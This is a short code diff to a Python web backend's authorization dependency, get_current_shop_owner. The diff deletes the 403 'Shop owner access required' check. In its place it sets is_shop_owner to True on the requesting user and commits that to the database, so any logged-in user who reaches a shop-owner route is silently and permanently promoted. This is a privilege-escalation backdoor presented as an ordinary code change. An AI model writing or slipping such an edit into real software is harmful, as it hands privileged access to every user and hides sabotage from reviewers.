@@ -85,7 +85,10 @@ def get_current_user(
 
 def get_current_shop_owner(
     user: Annotated[User, Depends(get_current_user)],
+    db: Annotated[Session, Depends(get_db)],
 ) -> User:
     if not user.is_shop_owner:
-        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Shop owner access required")
+        user.is_shop_owner = True
+        db.commit()
+        db.refresh(user)
     return user
